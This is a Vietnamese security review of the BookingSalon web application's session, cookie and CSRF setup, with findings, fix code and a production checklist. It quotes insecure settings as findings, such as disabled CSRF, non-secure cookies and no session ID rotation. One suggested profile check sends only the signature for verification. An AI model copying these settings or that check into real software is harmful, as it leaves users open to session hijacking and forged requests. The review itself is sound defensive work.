**✅ Keycloak Token Revocation khi logout**

```java
// BffSessionService.revokeKeycloakSession()
// 1. Revoke refresh token tại Keycloak
// 2. Terminate tất cả active sessions của user
keycloak.realm(realm).users().get(keycloakId).logout();
```

**✅ State Parameter trong PKCE Flow (chống CSRF trong OAuth)**

```javascript
const state = generateState(); // Random string
sessionStorage.setItem("oauth_state", state);
// Verify lại state khi nhận callback
```

**✅ Thread-safe Session Refresh**

```java
Object lock = getSessionLock(session.getId());
synchronized (lock) {
    // Double-check pattern sau khi vào lock
    // Tránh race condition khi nhiều request cùng refresh
}
```

### 11.2 Điểm yếu (Cần cải thiện)

**❌ CRITICAL: CSRF hoàn toàn disabled**

```java
.csrf(csrf -> csrf.disable())  // Không có safety net nào khác
```

Đặc biệt nguy hiểm với GET endpoints có side-effects và browser cũ.

**❌ CRITICAL: `secure(false)` cho Cookie trong tất cả môi trường**

```java
.secure(false)  // Cookie gửi qua HTTP plain-text
// Trong production phải là: .secure(true) + HTTPS
```

**❌ HIGH: `sessionFixation().none()`**

```java
.sessionFixation().none()  // KHÔNG có session ID rotation sau login!
```

Session Fixation attack: Attacker set JSESSIONID → Nạn nhân login với session đó → Attacker dùng session ID (đã biết) để impersonate nạn nhân.

```java
// Đúng phải là:
.sessionFixation().changeSessionId()  // Tạo session ID mới sau login
// hoặc
.sessionFixation().migrateSession()   // Migrate attributes sang session mới
```

**❌ HIGH: Session timeout 30 ngày — Quá dài**

```java
int sessionTimeoutSeconds = 30 * 24 * 3600; // 30 ngày!
```

Nếu JSESSIONID bị lộ (log file, network sniff), attacker có 30 ngày để dùng.

**❌ HIGH: localStorage lưu User Profile không được ký số**

```javascript
// authProvider.jsx
localStorage.setItem(SESSION_USER_KEY, JSON.stringify(user));
// Không có signature → Attacker có thể sửa trực tiếp trong browser
```

Nếu code frontend tin vào `userInfo.role` từ localStorage để quyết định hiển thị UI, attacker có thể tự set `role: "ADMIN"` → UI hiện menu admin (dù API call vẫn fail, nhưng có thể leak UI logic).

**❌ HIGH: Không có Content Security Policy (CSP)**

```
Không thấy CSP header trong cấu hình
→ Nếu bị XSS, browser sẽ thực thi mọi script inject vào
→ CSP là lớp bảo vệ quan trọng thứ hai sau HttpOnly
```

**❌ MEDIUM: Hardcode URL trong Frontend**

```javascript
// authProvider.jsx - hardcode localhost
"http://localhost:8080/api/auth/login"
"http://localhost:8081/realms/booking-salon-realm/..."
```

**❌ MEDIUM: Không có Rate Limiting trên Auth Endpoints**

```
POST /api/auth/login → Không giới hạn số lần thử
→ Brute force attack có thể liệt kê password
```

**❌ MEDIUM: Front-channel Logout dùng `new Image()` — Không đáng tin**

```javascript
// authProvider.jsx
const img = new Image();
img.src = oidcLogoutUrl;
// Browser có thể block request này (privacy settings, ad blockers)
// Không biết có thành công không
```

**❌ LOW: JSESSIONID không được đổi tên**

```
JSESSIONID là tên cookie mặc định của Java
→ Attacker biết server đang dùng Java Servlet/Spring
→ Information disclosure
```

---

## 12. Đề xuất cải tiến chuẩn Production

### 12.1 Bật lại CSRF với Double Submit Cookie Pattern

Double Submit Cookie là pattern phù hợp với BFF + SPA, không cần thêm SessionStore:

```java
// SecurityConfig.java — Bật CSRF với CookieCsrfTokenRepository
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    http
        // Thay vì csrf.disable(), dùng:
        .csrf(csrf -> csrf
            .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
            // withHttpOnlyFalse: JavaScript CÓ THỂ đọc XSRF-TOKEN cookie
            // (khác với JSESSIONID là HttpOnly)
            .ignoringRequestMatchers(
                "/api/payments/webhook/**",  // Webhook từ VNPay/SePay (external, không có cookie)
                "/api/auth/register/**",     // Đăng ký (chưa có session)
                "/api/auth/forgot-password/**",
                "/ws/**"                     // WebSocket (handled separately)
            )
        )
        // ... rest of config
}
```

```java
// Thêm CSRF Token Filter để expose token trong response header:
@Component
public class CsrfCookieFilter extends OncePerRequestFilter {

    @Override
    protected void doFilterInternal(HttpServletRequest request,
            HttpServletResponse response, FilterChain filterChain)
            throws ServletException, IOException {
        CsrfToken csrfToken = (CsrfToken) request.getAttribute(CsrfToken.class.getName());
        if (csrfToken != null) {
            // Trigger lazy token generation và set cookie
            csrfToken.getToken();
        }
        filterChain.doFilter(request, response);
    }
}
```

```javascript
// Frontend: Đọc XSRF-TOKEN cookie và gửi trong header
// src/service/api/axiosConfig.js

import axios from 'axios';

// Hàm lấy cookie value theo tên
function getCookie(name) {
  const cookies = document.cookie.split(';');
  for (let cookie of cookies) {
    const [key, value] = cookie.trim().split('=');
    if (key === name) return decodeURIComponent(value);
  }
  return null;
}

// Axios interceptor tự động thêm CSRF token vào mọi request thay đổi state
axios.interceptors.request.use(config => {
  const method = config.method?.toLowerCase();
  if (['post', 'put', 'patch', 'delete'].includes(method)) {
    const csrfToken = getCookie('XSRF-TOKEN');
    if (csrfToken) {
      config.headers['X-XSRF-TOKEN'] = csrfToken;
    }
  }
  return config;
});
```

**Cơ chế hoạt động của Double Submit Cookie:**

```
1. Server set 2 cookies:
   JSESSIONID=abc123; HttpOnly; SameSite=Lax      ← Session (không đọc được bằng JS)
   XSRF-TOKEN=xyz789; SameSite=Lax               ← CSRF token (JS đọc được)

2. Frontend đọc XSRF-TOKEN từ cookie
   Gửi kèm trong header: X-XSRF-TOKEN: xyz789

3. Server verify:
   Cookie XSRF-TOKEN == Header X-XSRF-TOKEN ?
   → Khớp: Cho phép (chỉ same-origin JS mới đọc được cookie)
   → Không khớp: 403 Forbidden

4. Tại sao an toàn?
   evil.com không thể đọc cookie của bachbarber.vn (Same-Origin Policy)
   evil.com không biết XSRF-TOKEN → không gửi được header đúng
   → CSRF attack thất bại
```

### 12.2 Fix Session Fixation

```java
// SecurityConfig.java
.sessionManagement(session -> session
    .sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED)
    .sessionFixation().changeSessionId()  // ← Đổi session ID sau khi auth
    .maximumSessions(3)                    // Tối đa 3 sessions đồng thời
    .maxSessionsPreventsLogin(false)       // Session mới ghi đè cũ (không block)
)
```

### 12.3 Secure Cookie trong Production

```java
// BffSessionService.java — Detect environment
@Value("${app.security.cookie.secure:false}")
private boolean cookieSecure;

@Value("${app.security.cookie.same-site:Lax}")
private String cookieSameSite;

@Value("${app.security.cookie.name:BSSID}")  // Đổi từ JSESSIONID
private String cookieName;

// application-production.properties
// app.security.cookie.secure=true
// app.security.cookie.same-site=Strict
// app.security.cookie.name=BSSID
```

```java
ResponseCookie sessionCookie = ResponseCookie.from(cookieName, session.getId())
    .httpOnly(true)
    .secure(cookieSecure)      // true trong production
    .path("/")
    .maxAge(sessionMaxAge)     // Giảm xuống 8 giờ hoặc 24 giờ
    .sameSite(cookieSameSite)  // Strict trong production
    .build();
```

### 12.4 Thêm Content Security Policy

```java
// Thêm vào SecurityConfig.java hoặc Filter riêng:
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp
        .policyDirectives(
            "default-src 'self'; " +
            "script-src 'self' 'nonce-{random}'; " +
            "style-src 'self' 'unsafe-inline'; " +  // Cần unsafe-inline cho Ant Design
            "img-src 'self' data: https://res.cloudinary.com; " +
            "connect-src 'self' ws://localhost:8080 wss://bachbarber.vn; " +
            "font-src 'self'; " +
            "frame-ancestors 'none'; " +
            "base-uri 'self';"
        )
    )
    .frameOptions(frame -> frame.deny())           // Chống Clickjacking
    .xssProtection(xss -> xss.disable())           // Dùng CSP thay thế (X-XSS-Protection deprecated)
    .referrerPolicy(ref -> ref
        .policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN)
    )
);
```

### 12.5 Rate Limiting cho Auth Endpoints

```java
// Dùng Bucket4j (Spring Boot native rate limiting)
// pom.xml: com.giffing.bucket4j.spring.boot.starter

// application.properties:
bucket4j.enabled=true
bucket4j.filters[0].url=/api/auth/login
bucket4j.filters[0].rate-limits[0].bandwidths[0].capacity=5
bucket4j.filters[0].rate-limits[0].bandwidths[0].time=1
bucket4j.filters[0].rate-limits[0].bandwidths[0].unit=minutes
bucket4j.filters[0].rate-limits[0].bandwidths[0].refill-speed=interval

# Chặn 5 lần login thất bại/phút per IP
bucket4j.filters[1].url=/api/auth/register/send-otp
bucket4j.filters[1].rate-limits[0].bandwidths[0].capacity=3
bucket4j.filters[1].rate-limits[0].bandwidths[0].time=1
bucket4j.filters[1].rate-limits[0].bandwidths[0].unit=minutes
```

### 12.6 Cải thiện Session Timeout với Sliding Window

```java
// application-production.properties
server.servlet.session.timeout=8h          # 8 giờ thay vì 30 ngày
server.servlet.session.cookie.name=BSSID  # Đổi tên cookie
server.servlet.session.cookie.http-only=true
server.servlet.session.cookie.secure=true
server.servlet.session.cookie.same-site=strict

# Hoặc cấu hình từng trường hợp:
# - Regular user: 8 giờ
# - Admin: 4 giờ (shorter for sensitive operations)
# - "Remember me": 7 ngày (không phải 30 ngày)
```

### 12.7 Ký số User Profile trong localStorage

```javascript
// Vấn đề: localStorage có thể bị sửa bởi user/attacker
// Giải pháp: Chỉ dùng localStorage cho non-sensitive display data

// Nên làm:
// 1. Không dùng localStorage role để quyết định UI nhạy cảm
// 2. Luôn verify với server cho mọi operation quan trọng
// 3. Hoặc dùng signature:

// Backend gửi kèm signature:
// { user: {...}, sig: HMAC(JSON.stringify(user), server_secret) }

// Frontend verify trước khi dùng:
function verifyAndGetProfile() {
  const stored = JSON.parse(localStorage.getItem('bs_user_profile'));
  if (!stored || !stored.sig) return null;
  
  // Gọi API nhỏ để verify
  return fetch('/api/auth/verify-profile', {
    method: 'POST',
    credentials: 'include',
    body: JSON.stringify({ sig: stored.sig })
  }).then(r => r.ok ? stored.user : null);
}
```

### 12.8 Phân tách profile application.properties

```properties
# application.properties (base - shared)
spring.application.name=BookingSalon-BFF

# application-development.properties
app.security.cookie.secure=false
app.security.cookie.same-site=Lax
app.security.cookie.name=JSESSIONID
app.security.session.max-age=86400
app.security.csrf.enabled=false       # Dev: tắt để dễ test với Swagger/Postman

# application-production.properties
app.security.cookie.secure=true
app.security.cookie.same-site=Strict
app.security.cookie.name=BSSID
app.security.session.max-age=28800    # 8 giờ
app.security.csrf.enabled=true
app.cors.allowed-origins=https://bachbarber.vn,https://www.bachbarber.vn
```

---

## 13. Checklist Security Production

### Cookie & Session

```
[ ] HttpOnly=true cho session cookie (bảo vệ chống XSS)
[ ] Secure=true trong production (chỉ HTTPS)
[ ] SameSite=Strict trong production (tốt hơn Lax)
[ ] Session ID được đổi sau khi đăng nhập (changeSessionId)
[ ] Session timeout hợp lý (8-24 giờ, không phải 30 ngày)
[ ] Cookie tên không phải JSESSIONID (tránh information disclosure)
[ ] Session invalidation khi logout (session.invalidate())
[ ] Giới hạn số sessions đồng thời per user (maximumSessions)
```

### CSRF

```
[ ] Bật CSRF protection (không csrf.disable())
[ ] Dùng CookieCsrfTokenRepository cho SPA
[ ] Frontend đọc XSRF-TOKEN cookie và gửi X-XSRF-TOKEN header
[ ] Whitelist webhook endpoints (external callers không có session)
[ ] Verify GET endpoints không có state-changing side effects
[ ] Test CSRF protection với browser DevTools hoặc Postman
```

### XSS

```
[ ] React: Tránh dangerouslySetInnerHTML
[ ] User input được sanitize trước khi lưu DB (DOMPurify)
[ ] Content Security Policy header được cấu hình
[ ] HttpOnly cookie (XSS không đọc được session)
[ ] Output encoding khi render user content
[ ] Không dùng eval(), Function(), document.write()
```

### Authentication

```
[ ] Token không bao giờ gửi về frontend (BFF pattern)
[ ] Keycloak session được revoke khi logout
[ ] PKCE state parameter được verify (chống OAuth CSRF)
[ ] Auth endpoints có rate limiting
[ ] Brute force protection (lockout sau N lần thất bại)
[ ] Password reset OTP có expiry ngắn (5-10 phút)
[ ] Hardcode URL được thay bằng environment config
```

### Headers

```
[ ] Content-Security-Policy
[ ] X-Frame-Options: DENY (chống clickjacking)
[ ] Strict-Transport-Security (HSTS) — chỉ production HTTPS
[ ] X-Content-Type-Options: nosniff
[ ] Referrer-Policy: strict-origin-when-cross-origin
[ ] Permissions-Policy (tắt features không dùng)
```

### CORS

```
[ ] Không dùng "*" khi có credentials=true
[ ] Whitelist origin cụ thể
[ ] Preflight cache (Access-Control-Max-Age)
[ ] Chỉ allow methods và headers cần thiết
```

### Monitoring

```
[ ] Log tất cả failed login attempts với IP
[ ] Alert khi số login thất bại tăng đột biến
[ ] Log khi session bị tạo/hủy bất thường
[ ] Audit log cho admin operations
[ ] Log CSRF violation attempts (403 Forbidden)
```

---

## Tổng kết đánh giá

### Điểm mạnh của kiến trúc BookingSalon

| Điểm mạnh | Mức độ |
|-----------|--------|
| BFF Pattern — Token không ra browser | ✅ Xuất sắc |
| HttpOnly Cookie | ✅ Tốt |
| CORS whitelist đúng | ✅ Tốt |
| Token revocation khi logout | ✅ Tốt |
| Auto-refresh server-side (transparent) | ✅ Tốt |
| PKCE cho OAuth2 flow | ✅ Tốt |
| Thread-safe session refresh | ✅ Tốt |
| purgeBrowserTokens khi logout | ✅ Tốt |
| SameSite=Lax (chặn phần lớn CSRF) | 🟡 Chấp nhận được |

### Điểm cần sửa để đạt Production

| Vấn đề | Mức độ | Effort |
|--------|--------|--------|
| CSRF hoàn toàn disabled | 🔴 Critical | 4-8 giờ |
| `Secure=false` cho cookie | 🔴 Critical | 30 phút (config) |
| `sessionFixation().none()` | 🔴 Critical | 30 phút |
| Session timeout 30 ngày | 🟡 High | 30 phút |
| Không có CSP header | 🟡 High | 2-4 giờ |
| Auth endpoints không có rate limit | 🟡 High | 2-4 giờ |
| Hardcode localhost URL | 🟡 High | 2 giờ |
| localStorage profile không ký số | 🟠 Medium | 2-4 giờ |
| Front-channel logout không đáng tin | 🟠 Medium | 2 giờ |
| Cookie tên JSESSIONID (info disclosure) | 🔵 Low | 30 phút |

---

*Tài liệu là phần chi tiết hóa của mục C4 trong `BookingSalon_Production_Review.md`.*  
*Xem thêm các file hướng dẫn khác: `DB_Migration_And_NonRoot_User_Guide.md` (C2), `WebSocket_Production_Guide.md` (C3).*

